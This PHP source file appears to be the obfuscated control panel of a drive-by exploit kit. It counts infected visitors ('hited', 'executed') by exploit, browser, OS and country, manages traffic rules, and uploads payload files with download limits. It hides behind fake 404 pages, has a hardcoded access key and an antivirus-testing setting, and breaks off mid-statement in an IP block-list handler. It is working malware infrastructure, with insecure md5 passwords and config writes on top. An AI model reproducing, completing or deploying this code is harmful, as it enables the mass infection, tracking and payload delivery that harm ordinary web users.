<?php 
ini_set("display_errors", 1);
error_reporting(E_ALL);
$configFileName = "config.php";
session_start();
define("ADMIN_LOADED", "1");
date_default_timezone_set("Europe/Moscow");
$allowedChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-.()";
include_once("./" . $configFileName);
include_once("./" . Config::get("LibDir", "lib") . "/js.php");
include_once("./" . Config::get("LibDir", "lib") . "/lang.php");
include_once("./" . Config::get("LibDir", "lib") . "/browser.php");
include_once("./" . Config::get("LibDir", "lib") . "/browser2.php");
include_once("./" . Config::get("LibDir", "lib") . "/files.php");
include_once("./" . Config::get("LibDir", "lib") . "/template.php");
include_once("./" . Config::get("LibDir", "lib") . "/errors.php");
include_once("./" . Config::get("LibDir", "lib") . "/db.php");
include_once("./" . Config::get("LibDir", "lib") . "/funcs.php");
include_once("./" . Config::get("LibDir", "lib") . "/logs.php");
include_once("./" . Config::get("LibDir", "lib") . "/prefs.php");
include_once("./" . Config::get("LibDir", "lib") . "/threads.php");
if( !isset($_SESSION[LANG_VARIABLE]) && isset($_COOKIE["LastLanguage"]) ) 
{
    Lang::setcurlang($_COOKIE["LastLanguage"]);
}
else
{
    Lang::setcurlangifnotset(Config::get("DefaultLanguage", "en"));
}

if( !isset($_SESSION[TEMPLATE_VARIABLE]) && isset($_COOKIE["LastTemplate"]) ) 
{
    Template::setcurtemplate($_COOKIE["LastTemplate"]);
}
else
{
    Template::setcurtemplateifnotset(Config::get("DefaultTemplate", "default"));
}

Config::set("AdminScriptName", urlencode(basename($_SERVER["SCRIPT_NAME"])));
Config::set("AuthVariable", $_SERVER["SCRIPT_NAME"]);
if( !isset($_SESSION[Config::get("AuthVariable", "Auth")]) && !isset($_SESSION["tmpAuth"]) && Config::get("AdminScriptName") == Config::get("StatFileName") . ".php" && (!isset($_GET["threadID"]) || !isset($_GET["ruleID"]) || !isset($_GET["key"])) ) 
{
    header("HTTP/1.0 404 Not Found");
    exit();
}

Config::set("ConfigFileName", $configFileName);
if( isset($_POST["AuthPass"]) ) 
{
    $AuthPass = md5($_POST["AuthPass"]);
    $AuthLanguage = $_POST["AuthLanguage"];
    $AuthTemplate = $_POST["AuthTemplate"];
    if( $AuthPass == Config::get("AdminPass") ) 
    {
        setcookie("LastLanguage", $AuthLanguage, time() + 3600 * 24 * 30, "/");
        setcookie("LastTemplate", $AuthTemplate, time() + 3600 * 24 * 30, "/");
        $_SESSION[Config::get("AuthVariable", "Auth")] = TRUE;
        Template::setcurtemplate($AuthTemplate);
        Lang::setcurlang($AuthLanguage);
        header("Location: " . Config::get("AdminScriptName"));
        exit();
    }

    Errors::add(Lang::get("WrongUserName"));
    unset($_SESSION[Config::get("AuthVariable", "Auth")]);
}

$curPage = (isset($_GET[Config::get("MainParamName")]) ? $_GET[Config::get("MainParamName")] : "index");
if( !isset($_SESSION[Config::get("AuthVariable", "Auth")]) ) 
{
    if( isset($_GET["threadID"]) && isset($_GET["ruleID"]) && $curPage == "index" && md5($_GET["threadID"] . $_GET["ruleID"] . "W#%^Q&V*)%#evywuitvo#Q57836Q&%v8935ve") == $_GET["key"] ) 
    {
        $_SESSION["tmpAuth"] = 1;
    }

    if( isset($_SESSION["tmpAuth"]) && ($curPage == "index" && isset($_GET["threadID"]) && isset($_GET["ruleID"]) && isset($_GET["key"]) || $curPage == "file" || $curPage == "BrowserStatistic" || $curPage == "RefererStatistic" || $curPage == "ThreadStatistic") ) 
    {
    }
    else
    {
        echo Template::show("login");
        exit();
    }

}

db::create(Config::get("MysqlHost"), Config::get("MysqlUsername"), Config::get("MysqlPassword"), Config::get("MysqlDatabase"));
include_once("./" . Config::get("LibDir", "lib") . "/threadDataLoader.php");
if( rand() % 20 == 1 ) 
{
    _obfuscated_0D292712112E16150D0A3B0B032A5B1F05380E312D3D22_();
}

$ajax = !empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == "xmlhttprequest";
$templateName = "";
switch( $curPage ) 
{
    case "logout":
        unset($_SESSION[Config::get("AuthVariable", "Auth")]);
        header("Location: " . Config::get("AdminScriptName"));
        db::close();
        exit();
    case "prefs":
        $templateName = "prefs";
        break;
    case "savePrefsNew":
        switch( $_POST["type"] ) 
        {
            case "MainRename":
                if( isset($_POST["MainRename"]) ) 
                {
                    $name = $_POST["MainRename"];
                    $name = str_replace("/", "", $name);
                    $name = str_replace("\\", "", $name);
                    $name = str_replace(".", "", $name);
                    $name = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($name);
                    $newFileName = $name . ".php";
                    $last = urldecode(Config::get("AdminScriptName"));
                    if( $newFileName != ".php" && $newFileName != $last && rename($last, $newFileName) ) 
                    {
                        file_put_contents(Config::get("StatFileName") . ".php", "<?php include('./" . $newFileName . "'); ?>");
                        echo urlencode($newFileName) . "?" . Config::get("MainParamName") . "=prefs";
                    }

                }

                break;
            case "password":
                if( md5($_POST["old"]) == Config::get("AdminPass") ) 
                {
                    if( $_POST["new1"] == $_POST["new2"] ) 
                    {
                        Config::write("AdminPass", md5($_POST["new1"]));
                        echo "1";
                    }
                    else
                    {
                        echo "2";
                    }

                }
                else
                {
                    echo "0";
                }

                break;
            case "StatRename":
                if( isset($_POST["StatRename"]) ) 
                {
                    $name = $_POST["StatRename"];
                    $name = str_replace("/", "", $name);
                    $name = str_replace("\\", "", $name);
                    $name = str_replace(".", "", $name);
                    $name = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($name);
                    $newFileName = $name . ".php";
                    $last = urldecode(Config::get("StatFileName") . ".php");
                    if( $newFileName != ".php" && $newFileName != $last && rename($last, $newFileName) ) 
                    {
                        Config::write("StatFileName", $name);
                    }

                }

                break;
            case "FrameRename":
                if( isset($_POST["FrameRename"]) ) 
                {
                    $name = $_POST["FrameRename"];
                    $name = str_replace("/", "", $name);
                    $name = str_replace("\\", "", $name);
                    $name = str_replace(".", "", $name);
                    $name = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($name);
                    $newFileName = $name . ".php";
                    $last = urldecode(Config::get("MainFileName") . ".php");
                    if( $newFileName != ".php" && $newFileName != $last && rename($last, $newFileName) ) 
                    {
                        Config::write("MainFileName", $name);
                    }

                }

                break;
            case "DownloadFileName":
                if( isset($_POST["DownloadFileName"]) ) 
                {
                    $name = $_POST["DownloadFileName"];
                    $name = str_replace("/", "", $name);
                    $name = str_replace("\\", "", $name);
                    $name = str_replace(".", "", $name);
                    $name = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($name);
                    $newFileName = $name . ".php";
                    $last = urldecode(Config::get("DownloadFileName") . ".php");
                    if( $newFileName != ".php" && $newFileName != $last && rename($last, $newFileName) ) 
                    {
                        Config::write("DownloadFileName", $name);
                    }

                }

                break;
            case "urltosmb":
                Config::write("urltosmb", str_replace("\\", "\\\\", $_POST["urltosmb"]));
                break;
            case "timeout":
                Config::write("AjaxAutoreloadInterval", intval($_POST["timeout"]));
                break;
            case "language":
                Config::write("DefaultLanguage", $_POST["language"]);
                Lang::setcurlang($_POST["language"]);
                break;
            case "template":
                Config::write("DefaultTemplate", $_POST["template"]);
                Template::setcurtemplate($_POST["template"]);
                break;
            case "limits":
                unset($_POST["type"]);
                $_POST["ShowReferers"] = ($_POST["ShowReferers"] != "null" ? 1 : 0);
                foreach( $_POST as $name => $value ) 
                {
                    Config::write($name, $value);
                }
                break;
            case "virtest":
                unset($_POST["type"]);
                $_POST["virtestLogin"] = $_POST["AVService"] . ":::" . $_POST["virtestLogin"];
                unset($_POST["AVService"]);
                foreach( $_POST as $name => $value ) 
                {
                    Config::write($name, $value);
                }
                break;
            case "StatParamName":
                $value = $_POST["StatParamName"];
                if( $value != "" && !preg_match("/[^a-zA-Z0-9]/", $value) ) 
                {
                    Config::write("StatParamName", $value);
                    echo "1";
                }
                else
                {
                    echo "0";
                }

        }
        db::close();
        exit();
    case "prefsSave":
        $ajax = !empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == "xmlhttprequest";
        $lines = file("./" . $configFileName);
        if( isset($_POST["NewPassword1"]) && $_POST["NewPassword1"] != "" && $_POST["NewPassword1"] == $_POST["NewPassword2"] ) 
        {
            $_POST["NewPassword1"] = md5($_POST["NewPassword1"]);
        }

        if( md5($_POST["OldPassword"]) != Config::get("AdminPass") ) 
        {
            $_POST["NewPassword1"] = "";
        }

        Lang::setcurlang($_POST["DefaultLanguage"]);
        Template::setcurtemplate($_POST["DefaultTemplate"]);
        foreach( $lines as &$line ) 
        {
            foreach( $_POST as $name => $value ) 
            {
                if( $name == "NewPassword1" && $value == "" ) 
                {
                    continue;
                }

                if( $name == "NewPassword1" ) 
                {
                    $name = "AdminPass";
                }

                if( $name == "StatParamName" && ($value == "" || preg_match("/[^a-zA-Z0-9]/", $value)) ) 
                {
                    continue;
                }

                if( preg_match("/.+'" . $name . "'.+=> '(.*)',/", $line, $arr) ) 
                {
                    $line = str_replace("'" . $arr[1] . "'", "'" . $value . "'", $line);
                }

            }
        }
        file_put_contents("./" . $configFileName, $lines);
        if( isset($_POST["MainRename"]) ) 
        {
            $name = $_POST["MainRename"];
            $name = str_replace("/", "", $name);
            $name = str_replace("\\", "", $name);
            $name = str_replace(".", "", $name);
            $name = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($name);
            $newFileName = $name . ".php";
            $last = urldecode(Config::get("AdminScriptName"));
            if( $newFileName != ".php" && $newFileName != $last && rename($last, $newFileName) ) 
            {
                header("Location: " . urlencode($newFileName) . "?" . Config::get("MainParamName") . "=prefs");
                db::close();
                exit();
            }

        }

        if( isset($_POST["StatRename"]) ) 
        {
            $name = $_POST["StatRename"];
            $name = str_replace("/", "", $name);
            $name = str_replace("\\", "", $name);
            $name = str_replace(".", "", $name);
            $name = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($name);
            $newFileName = $name . ".php";
            $last = urldecode(Config::get("StatFileName") . ".php");
            if( $newFileName != ".php" && $newFileName != $last && rename($last, $newFileName) ) 
            {
                Config::write("StatFileName", $name);
            }

        }

        if( isset($_POST["FrameRename"]) ) 
        {
            $name = $_POST["FrameRename"];
            $name = str_replace("/", "", $name);
            $name = str_replace("\\", "", $name);
            $name = str_replace(".", "", $name);
            $name = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($name);
            $newFileName = $name . ".php";
            $last = urldecode(Config::get("MainFileName") . ".php");
            if( $newFileName != ".php" && $newFileName != $last && rename($last, $newFileName) ) 
            {
                Config::write("MainFileName", $name);
            }

        }

        if( $ajax ) 
        {
        }
        else
        {
            header("Location: " . Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=prefs&result=1");
        }

        db::close();
        exit();
    case "langChange":
        Lang::setcurlang($_GET["lang"]);
        setcookie("LastLanguage", $_GET["lang"], time() + 3600 * 24 * 30, "/");
        header("Location: " . $_SERVER["HTTP_REFERER"]);
        db::close();
        exit();
    case "BrowserStatistic":
        echo json_encode(array( $_POST["BrowserID"], Logs::getfullstatisticsbybrowser($_POST["BrowserID"], (isset($_POST["StartDate"]) ? $_POST["StartDate"] : null), (isset($_POST["EndDate"]) ? $_POST["EndDate"] : null)) ));
        db::close();
        exit();
    case "RefererStatistic":
        echo json_encode(array( $_POST["RefererID"], Logs::getfullstatisticsbyreferer($_POST["RefererDomain"], (isset($_POST["StartDate"]) ? $_POST["StartDate"] : null), (isset($_POST["EndDate"]) ? $_POST["EndDate"] : null)) ));
        db::close();
        exit();
    case "ThreadStatistic":
        echo json_encode(array( $_POST["ThreadID"], Logs::getfullstatisticsbythread($_POST["ThreadID"], (isset($_POST["StartDate"]) ? $_POST["StartDate"] : null), (isset($_POST["EndDate"]) ? $_POST["EndDate"] : null)) ));
        db::close();
        exit();
    case "ExploitStatistic":
        echo json_encode(array( $_POST["ExploitID"], Logs::getfullstatisticsbyexploit($_POST["ExploitID"], (isset($_POST["StartDate"]) ? $_POST["StartDate"] : null), (isset($_POST["EndDate"]) ? $_POST["EndDate"] : null)) ));
        db::close();
        exit();
    case "refreshTotal":
        $stats = Logs::getglobalstatistics();
        echo json_encode(array( $stats["hosts"], $stats["hited"], $stats["executed"] ));
        db::close();
        exit();
    case "RefreshStatistics":
        $startDate = (isset($_POST["StartDate"]) ? intval($_POST["StartDate"]) : null);
        $endDate = (isset($_POST["EndDate"]) ? intval($_POST["EndDate"]) : null);
        $threadID = (isset($_GET["threadID"]) ? intval($_GET["threadID"]) : null);
        $ruleID = (isset($_GET["ruleID"]) ? intval($_GET["ruleID"]) : null);
        if( $ruleID == 0 ) 
        {
            $ruleID = null;
        }

        $browsers = Logs::getstatisticsbybrowser($startDate, $endDate, $threadID, $ruleID);
        $maxBrowserHosts = 0;
        $oses = Logs::getstatisticsbyos($startDate, $endDate, $threadID, $ruleID);
        $maxOSHosts = 0;
        $countries = Logs::getstatisticsbycountry($startDate, $endDate, $threadID, $ruleID);
        $maxCountryHosts = 0;
        $exploits = Logs::getstatisticsbyexploit($startDate, $endDate, $threadID, $ruleID);
        $maxExploitHosts = 0;
        $threads = Logs::getstatisticsbythread($startDate, $endDate, $threadID, $ruleID);
        $showReferers = Config::get("ShowReferers", 1);
        if( $showReferers ) 
        {
            $referers = Logs::getstatisticsbyreferers($startDate, $endDate, $threadID, $ruleID);
        }

        $fulls = array(  );
        if( isset($_POST["full"]) ) 
        {
            foreach( $_POST["full"] as $browserId ) 
            {
                $full = Logs::getfullstatisticsbybrowser($browserId, $startDate, $endDate, $threadID, $ruleID);
                $fulls[] = array( $browserId, $full );
            }
        }

        $fullt = array(  );
        if( isset($_POST["fullt"]) ) 
        {
            foreach( $_POST["fullt"] as $threadId ) 
            {
                $full = Logs::getfullstatisticsbythread($threadId, $startDate, $endDate, $threadID, $ruleID);
                $fullt[] = array( $threadId, $full );
            }
        }

        $fulle = array(  );
        if( isset($_POST["fulle"]) ) 
        {
            foreach( $_POST["fulle"] as $threadId ) 
            {
                $full = Logs::getfullstatisticsbyexploit($threadId, $startDate, $endDate, $threadID, $ruleID);
                $fulle[] = array( $threadId, $full );
            }
        }

        $fullsr = array(  );
        if( $showReferers && isset($_POST["fullr"]) ) 
        {
            foreach( $_POST["fullr"] as $refererDomain ) 
            {
                $full = Logs::getfullstatisticsbyreferer($refererDomain, $startDate, $endDate, $threadID);
                $fullsr[] = array( $refererDomain, $full );
            }
        }

        $stats = Logs::getglobalstatistics();
        $stats2 = Logs::getglobalstatisticstoday();
        $res = array( $browsers, $maxBrowserHosts, $oses, $maxOSHosts, $countries, $maxCountryHosts, $exploits, $maxExploitHosts, ($showReferers ? $referers : false), $threads, $fulls, $fullt, $fulle, $fullsr, $stats["hosts"], $stats["hosts2"], $stats["hited"], $stats["executed"], $stats2["hosts"], $stats2["hosts2"], $stats2["hited"], $stats2["executed"] );
        $widgetsData = Logs::getstatisticsbywidgets($startDate, $endDate, $threadID);
        foreach( $widgetsData as $widgetId => $widget ) 
        {
            $max = 0;
            foreach( $widget as $num => $entry ) 
            {
                if( $max < $entry["Hosts"] ) 
                {
                    $max = $entry["Hosts"];
                }

            }
            $res[] = $widgetId;
            $res[] = $max;
            $res[] = $widget;
        }
        echo json_encode($res);
        db::close();
        exit();
    case "savePrefs":
        foreach( $_POST as $name => $value ) 
        {
            $res = db::selectone("Value", "Prefs", "Name = \"" . mysql_real_escape_string($name) . "\"");
            if( $res === "" || $res != null ) 
            {
                db::update($name, array( "Value" => $value ), "Prefs", "Name");
            }
            else
            {
                db::insert(array( "Name" => $name, "Value" => $value ), "Prefs");
            }

        }
        break;
    case "addThread":
        $templateName = "addThread";
        break;
    case "saveThread":
        if( isset($_POST["lastId"]) ) 
        {
            Threads::editthread($_POST["lastId"], $_POST["threadTitle"]);
        }
        else
        {
            Threads::addthread($_POST["threadTitle"]);
        }

        db::close();
        exit();
    case "delThread":
        $threadID = ($ajax ? intval($_POST["threadId"]) : intval($_GET["threadId"]));
        Threads::delthread($threadID);
        if( !$ajax ) 
        {
            header("Location: " . $_SERVER["HTTP_REFERER"]);
        }

        db::close();
        exit();
    case "delRule":
        $id = ($ajax ? intval($_POST["ruleId"]) : intval($_GET["ruleId"]));
        Threads::delrule(0, $id);
        if( !$ajax ) 
        {
            header("Location: " . $_SERVER["HTTP_REFERER"]);
        }

        db::close();
        exit();
    case "addRule":
        $templateName = "addRule";
        break;
    case "addRule2":
        $templateName = "addRule2";
        break;
    case "addRule3":
        $templateName = "addRule3";
        break;
    case "saveRule":
        Threads::save();
        db::close();
        exit();
    case "threads":
        $templateName = "threads";
        break;
    case "threadsAjax":
        $templateName = "threadsAjax";
        break;
    case "browserVersions":
        $res = db::select("select BrowserVersion from Logs where BrowserID = " . intval($_POST["browserID"]) . " group by BrowserVersion order by BrowserVersion asc");
        foreach( $res as $r ) 
        {
            $version = $r["BrowserVersion"];
            if( floor($version) == $version ) 
            {
                $version .= ".0";
            }

            echo "<input type=\"checkbox\" checked=\"checked\" version=\"" . $version . "\"/> " . $version . "<br/>";
        }
        db::close();
        exit();
    case "reorderRules":
        Threads::reorder();
        break;
    case "editWidget":
    case "addWidget":
        $templateName = "addWidget";
        break;
    case "closeWidget":
        $id = $_POST["id"];
        db::deletebyid($id, "Widgets", "ID");
        db::deletebyid("widgets-" . $id . "Sort", "Prefs", "Name");
        db::deletebyid("widgets-" . $id . "Dest", "Prefs", "Name");
        $col1 = explode(",", db::selectone("Value", "Prefs", "Name = \"column-1\""));
        $col2 = explode(",", db::selectone("Value", "Prefs", "Name = \"column-2\""));
        $str = "" . "'widget-" . $id . "'";
        $pos = array_search($str, $col1);
        if( $pos !== false ) 
        {
            array_splice($col1, $pos, 1);
            db::update("column-1", array( "Value" => implode(",", $col1) ), "Prefs", "Name");
        }

        $pos = array_search($str, $col2);
        if( $pos !== false ) 
        {
            array_splice($col2, $pos, 1);
            db::update("column-2", array( "Value" => implode(",", $col2) ), "Prefs", "Name");
        }

        break;
    case "addWidgetSave":
        $insert = array( "browsers" => "", "oses" => "", "countries" => "", "threads" => "" );
        foreach( $_POST as $type => $value ) 
        {
            if( $type == "title" ) 
            {
                continue;
            }

            if( $type == "widgetID" ) 
            {
                continue;
            }

            if( $value == "" ) 
            {
                continue;
            }

            $values = explode(",", $value);
            $reses = array(  );
            foreach( $values as $val ) 
            {
                $res = 0;
                switch( $type ) 
                {
                    case "browsers":
                        $res = array_search($val, Browser::$browsers);
                        break;
                    case "oses":
                        $res = array_search($val, array_keys(Browser::$OSList));
                        break;
                    case "countries":
                        $res = array_search($val, Browser::$countryNames);
                        break;
                    case "exploits":
                        $res = array_search($val, Browser::$exploits);
                        break;
                    case "threads":
                        $res = db::selectone("ID", "Threads", "Title=\"" . mysql_real_escape_string($val) . "\"");
                }
                $reses[] = $res;
            }
            $insert[$type] = implode(",", $reses);
        }
        $str = $_POST["title"];
        $insert["Title"] = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($str);
        if( isset($_POST["widgetID"]) ) 
        {
            $id = intval($_POST["widgetID"]);
            db::update($id, $insert, "Widgets", "ID");
        }
        else
        {
            $id = db::insert($insert, "Widgets");
            $column1 = db::selectone("Value", "Prefs", "Name=\"column-1\"");
            $arr = explode(",", $column1);
            $arr[] = "" . "'widget-" . $id . "'";
            db::update("column-1", array( "Value" => implode(",", $arr) ), "Prefs", "Name");
            db::insert(array( "Name" => "widgets-" . $id . "Sort", "Value" => "Hosts" ), "Prefs");
            db::insert(array( "Name" => "widgets-" . $id . "Dest", "Value" => "-1" ), "Prefs");
        }

        $_SESSION["NewWidgetID"] = $id;
        $templateName = "newWidget";
        break;
    case "files":
        $templateName = "files";
        break;
    case "filesAjax":
        $templateName = "filesAjax";
        break;
    case "fileDelete":
        if( isset($_GET["fileName"]) && strpos($_GET["fileName"], "/") === false ) 
        {
            unlink(Config::get("FilesDir") . "/" . $_GET["fileName"]);
        }

        header("Location: " . $_SERVER["HTTP_REFERER"]);
        db::close();
        exit();
    case "deleteFile":
        $id = ($ajax ? intval($_POST["fileID"]) : intval($_GET["fileID"]));
        $title = db::selectone("Title", "Files", "ID = " . $id);
        $res = db::select("select RuleID from FilesInRules where FileID = " . $id);
        $finded = 0 < count($res);
        if( $finded ) 
        {
            if( $ajax ) 
            {
                echo "0";
            }

        }
        else
        {
            db::deletebyid($id, "Files");
            unlink(Config::get("FilesDir") . "/" . $id);
            db::query("delete from Antivirus where FileID=" . $id);
            _obfuscated_0D2C221E3B070F0F2B0D0437082C04383B3226221C0801_(Config::get("FilesDir") . "/dir" . $id);
            if( $ajax ) 
            {
                echo "1";
            }

        }

        if( !$ajax ) 
        {
            header("Location: " . $_SERVER["HTTP_REFERER"]);
        }

        db::close();
        exit();
    case "addFile":
        $templateName = "addFile";
        break;
    case "fileUploadAjax":
    case "fileUpload":
        if( $_FILES["file"]["tmp_name"] != "" && (!isset($_POST["FileUpload"]) || isset($_POST["FileUpload"]) && isset($_POST["FileReplace"])) ) 
        {
            $fileName = $_FILES["file"]["name"];
            $goodFileName = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($fileName);
            $goodFileName = substr($goodFileName, 0, strpos($goodFileName, "."));
            $content = file_get_contents($_FILES["file"]["tmp_name"]);
            $crc32 = crc32($content);
            $md5 = md5($content);
            $comment = "";
            if( isset($_POST["FileComment"]) ) 
            {
                $comment = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($_POST["FileComment"]);
                if( $comment == Lang::get("DefComment") ) 
                {
                    $comment = "";
                }

            }

            $limit = (0 < intval($_POST["Limit"]) ? intval($_POST["Limit"]) : 0 - 1);
            if( !isset($_POST["fileID"]) ) 
            {
                $fileID = db::insert(array( "Title" => $goodFileName, "Comment" => $comment, "Date" => time(), "CRC32" => $crc32, "MD5" => $md5, "FileLimit" => $limit ), "Files");
            }
            else
            {
                $fileID = intval($_POST["fileID"]);
                $limit2 = db::selectone("FileLimit", "Files", "ID = " . $fileID);
                $fileName = Threads::findfilename($fileID);
                $curLimit = Threads::findfile($fileID);
                $path = Config::get("FilesDir") . "/";
                unlink($path . $fileName);
                if( $limit != 0 - 1 ) 
                {
                    if( $limit2 != 0 - 1 ) 
                    {
                        $curLimit += $limit - $limit2;
                        if( $curLimit < 0 ) 
                        {
                            $curLimit = 0;
                        }

                    }
                    else
                    {
                        $curLimit = $limit - abs($curLimit) + 1;
                        if( $curLimit < 0 ) 
                        {
                            $curLimit = 0;
                        }

                    }

                }
                else
                {
                    if( $limit != $limit2 ) 
                    {
                        $loaded = $limit2 - $curLimit;
                        $curLimit = 0 - 1 - $loaded;
                    }

                }

                if( isset($_POST["FileNull"]) ) 
                {
                    $curLimit = $limit;
                }

                db::update($fileID, array( "Title" => $goodFileName, "Comment" => $comment, "Date" => time(), "CRC32" => $crc32, "MD5" => $md5, "FileLimit" => $limit ), "Files");
            }

            $fullFileName = Config::get("FilesDir") . "/" . $fileID;
            if( isset($_POST["fileID"]) ) 
            {
                move_uploaded_file($_FILES["file"]["tmp_name"], $fullFileName);
                $fullFileName = Config::get("FilesDir") . "/dir" . $fileID;
                foreach( scandir($fullFileName) as $f ) 
                {
                    if( $f != "." && $f != ".." ) 
                    {
                        unlink($fullFileName . "/" . $f);
                    }

                }
                fclose(fopen($fullFileName . "/" . $curLimit, "w"));
            }
            else
            {
                move_uploaded_file($_FILES["file"]["tmp_name"], $fullFileName);
                $fullFileName = Config::get("FilesDir") . "/dir" . $fileID;
                mkdir($fullFileName, 511);
                file_put_contents($fullFileName . "/index.php", "<?php header(\"HTTP/1.0 404 Not Found\");?>");
                fclose(fopen($fullFileName . "/" . $limit, "w"));
            }

            if( $curPage == "fileUpload" ) 
            {
                header("Location: " . Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=files");
            }
            else
            {
                echo "<div id=\"result\">" . $fileID . "::" . $goodFileName . "</div>";
            }

            db::close();
            exit();
        }
        else
        {
            $limit = (0 < intval($_POST["Limit"]) ? intval($_POST["Limit"]) : 0 - 1);
            $fileID = intval($_POST["fileID"]);
            $limit2 = db::selectone("FileLimit", "Files", "ID = " . $fileID);
            if( $limit2 != $limit || isset($_POST["FileNull"]) ) 
            {
                $fileName = Threads::findfilename($fileID);
                $curLimit = Threads::findfile($fileID);
                $path = Config::get("FilesDir") . "/";
                if( $limit != 0 - 1 ) 
                {
                    if( $limit2 != 0 - 1 ) 
                    {
                        $curLimit += $limit - $limit2;
                        if( $curLimit < 0 ) 
                        {
                            $curLimit = 0;
                        }

                    }
                    else
                    {
                        $curLimit = $limit - abs($curLimit) + 1;
                        if( $curLimit < 0 ) 
                        {
                            $curLimit = 0;
                        }

                    }

                }
                else
                {
                    if( $limit != $limit2 ) 
                    {
                        $loaded = $limit2 - $curLimit;
                        $curLimit = 0 - 1 - $loaded;
                    }

                }

                if( isset($_POST["FileNull"]) ) 
                {
                    $curLimit = $limit;
                }

                $dir = Config::get("FilesDir") . "/dir" . $fileID;
                foreach( scandir($dir) as $f ) 
                {
                    if( $f != "." && $f != ".." ) 
                    {
                        unlink($dir . "/" . $f);
                    }

                }
                fclose(fopen($dir . "/" . $curLimit, "w"));
            }

            if( isset($_POST["fileID"]) && isset($_POST["FileComment"]) && isset($_POST["Limit"]) ) 
            {
                $comment = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($_POST["FileComment"]);
                if( $comment == Lang::get("DefComment") ) 
                {
                    $comment = "";
                }

                db::update(intval($_POST["fileID"]), array( "Comment" => $comment, "FileLimit" => $limit ), "Files");
            }

            if( $curPage == "fileUpload" ) 
            {
                header("Location: " . Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=files");
            }
            else
            {
                echo "<div id=\"result\"></div>";
            }

            db::close();
            exit();
        }

    case "file":
        header("Cache-Control: maxage=2592000");
        $type = (isset($_GET["type"]) ? $_GET["type"] : null);
        $file = (isset($_GET["file"]) ? $_GET["file"] : null);
        $isIcon = strpos($file, "icons/") !== false;
        $file = str_replace("..", "", $file);
        $file = str_replace("/", "", $file);
        $file = str_replace("\\", "", $file);
        $dir = null;
        switch( $type ) 
        {
            case "js":
                $dir = Config::get("JSDir");
                break;
            case "css":
                header("content-type: text/css");
                $dir = Config::get("TemplatesDir") . "/" . Template::getcurtemplate() . "/" . Config::get("CSSDir");
                break;
            case "img":
                $dir = Config::get("TemplatesDir") . "/" . Template::getcurtemplate() . "/" . Config::get("ImgDir");
        }
        if( $dir != null ) 
        {
            $dir = Config::get("LibDir") . "/" . $dir;
            if( $isIcon ) 
            {
                $file = str_replace("icons", "icons/", $file);
                $file = str_replace("countries", "countries/", $file);
            }

            $path = $dir . "/" . $file;
            if( file_exists($path) ) 
            {
                $res = file_get_contents($path);
                if( $type == "css" ) 
                {
                    $res = str_replace("../img/", Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=file&type=img&file=", $res);
                }

                echo $res;
            }

        }

        db::close();
        exit();
    case "playPauseRule":
        $ruleID = ($ajax ? intval($_POST["ruleID"]) : intval($_GET["ruleID"]));
        $state = ($ajax ? intval($_POST["state"]) : intval($_GET["state"]));
        if( $state < 0 || 1 < $state ) 
        {
            $state = 1;
        }

        db::update($ruleID, array( "Active" => $state ), "Rules");
        Threads::realsave();
        db::close();
        if( !$ajax ) 
        {
            header("Location: " . $_SERVER["HTTP_REFERER"]);
        }

        exit();
    case "moveRuleDown":
        $ruleID = intval($_GET["ruleID"]);
        $threadID = db::selectone("ThreadID", "Rules", "ID=" . $ruleID);
        $res = db::select("select ID, Sort from Rules where ThreadID = " . $threadID . " order by Sort asc");
        for( $i = 0; $i < count($res); $i++ ) 
        {
            if( $res[$i]["ID"] == $ruleID ) 
            {
                db::update($res[$i]["ID"], array( "Sort" => $res[$i + 1]["Sort"] ), "Rules");
                db::update($res[$i + 1]["ID"], array( "Sort" => $res[$i]["Sort"] ), "Rules");
                break;
            }

        }
        header("Location: " . $_SERVER["HTTP_REFERER"]);
        exit();
    case "moveRuleUp":
        $ruleID = intval($_GET["ruleID"]);
        $threadID = db::selectone("ThreadID", "Rules", "ID=" . $ruleID);
        $res = db::select("select ID, Sort from Rules where ThreadID = " . $threadID . " order by Sort asc");
        for( $i = 0; $i < count($res); $i++ ) 
        {
            if( $res[$i]["ID"] == $ruleID ) 
            {
                db::update($res[$i]["ID"], array( "Sort" => $res[$i - 1]["Sort"] ), "Rules");
                db::update($res[$i - 1]["ID"], array( "Sort" => $res[$i]["Sort"] ), "Rules");
                break;
            }

        }
        header("Location: " . $_SERVER["HTTP_REFERER"]);
        exit();
    case "fileScan":
        $templateName = "fileScan";
        break;
    case "showLast":
        $templateName = "fileScan2";
        break;
    case "secur":
        $templateName = "secur";
        if( isset($_FILES["file"]) && $_FILES["file"]["tmp_name"] != "" ) 
        {
            $content = file($_FILES["file"]["tmp_name"]);
            foreach( $content as $line ) 
            {
                $line = str_replace("\r", "", $line);
                $line = str_replace("\n", "", $line);
                $type = 0 - 1;
                if( strpos($line, "http://") === 0 ) 
                {
                    $type = 0;
                    $title = $line;
                }
                else
                {
                    $arr = explode(".", $line);
                    if( count($arr) == 4 ) 
                    {
                        $good = true;
                        foreach( $arr as $a ) 
                        {
                            if( $a == "*" || $a === 0 || 0 < intval($a) && intval($a) < 256 ) 
                            {
                            }
                            else
                            {
                                $good = false;
                                break;
                            }

                        }
                        if( $good ) 
                        {
                            $type = 1;
                            $title = $line;
                        }

                    }

                }

                if( $type != 0 - 1 ) 
                {
                    $title = mysql_real_escape_string($title);
                    $res = db::selectone("ID", "IP", "Title=\"" . $title . "\"");
                    if( $res == null ) 
